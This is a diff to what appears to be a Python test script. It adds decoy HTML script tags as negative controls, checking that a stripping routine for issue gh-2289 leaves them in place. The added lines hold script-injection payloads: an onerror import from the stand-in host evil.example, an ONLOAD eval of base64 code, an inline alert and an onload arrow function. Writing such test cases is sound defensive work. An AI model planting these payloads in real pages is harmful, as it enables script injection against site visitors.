@@ -2165,6 +2165,10 @@ def main():
         "data-src + evil src": b'<script data-src="' + cf + b'" src="https://evil.example/x.js"></script>',
         "evil src first, CF src second": b'<script src="https://evil.example/x.js" src="' + cf + b'"></script>',
         "x-src + evil src": b'<script x-src="' + cf + b'" src="https://evil.example/x.js"></script>',
+        "CF src + onerror import": b'<script src="' + cf + b'/nope" onerror="import(\'https://evil.example/x.js\')"></script>',
+        "CF src + ONLOAD eval": b'<script src="' + cf + b'" ONLOAD="eval(atob(\'YWxlcnQoMSk=\'))"></script>',
+        "CF src + inline body": b'<script src="' + cf + b'">alert(1)</script>',
+        "CF src + onload containing =>": b'<script src="' + cf + b'" onload="x=>{evil()}"></script>',
     }
     for name, tag in decoys.items():
         check("gh-2289 negative control: decoy NOT stripped (%s)" % name,
